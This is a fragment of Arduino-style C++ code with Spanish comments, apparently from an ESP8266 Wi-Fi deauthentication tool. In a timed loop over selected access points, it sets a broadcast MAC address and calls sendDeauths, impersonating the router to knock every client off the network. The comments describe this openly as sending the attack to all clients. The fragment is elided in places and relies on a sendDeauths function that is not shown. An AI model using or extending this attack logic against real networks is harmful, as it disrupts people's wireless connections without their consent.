  ...
  if (isRunning[0] && currentMillis - prevTime[0] >= 1000) {
    ...
    for (int a = 0; a < apScan.results; a++) {
      if (apScan.isSelected(a)) {
        ...
        if (_selectedClients == 0) { //manda el ataque a todos
          Mac _client; //crea un cliente
          _client.set(0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF); // direccióm mac de broadcast
          sendDeauths(_ap, _client); // manda el ataque definiendo que AP y a que cliente. Se hace pasar por el router y env`´ia al cliente
        }
